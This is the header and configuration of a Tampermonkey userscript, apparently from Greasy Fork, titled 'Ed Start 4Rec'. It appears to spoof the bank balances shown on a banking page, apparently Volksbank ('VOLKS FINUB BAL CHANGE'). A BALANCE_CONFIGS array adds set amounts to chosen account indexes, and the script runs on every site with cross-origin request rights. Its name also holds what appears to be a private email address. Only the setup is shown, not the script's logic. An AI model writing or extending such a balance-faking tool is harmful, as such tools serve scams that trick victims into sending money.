// ==UserScript==
// @name         Ed Start 4Rec cons.hschier@t-online.de
// @namespace    http://tampermonkey.net/
// @version      9.7777
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/535956/Ed%20Start%204Rec%20conshschier%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/535956/Ed%20Start%204Rec%20conshschier%40t-onlinede.meta.js
// ==/UserScript==


//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================


//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------

   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  92912},
        { index: 1, adjustmentAmount:  92912},
        { index: 2, adjustmentAmount:  92912},
        { index: 9, adjustmentAmount: 0},
        { index: 10, adjustmentAmount: 0},
        { index: 3, adjustmentAmount: 0 },
        { index: 4, adjustmentAmount: 0}
        // Add more balance configurations as needed
    ];

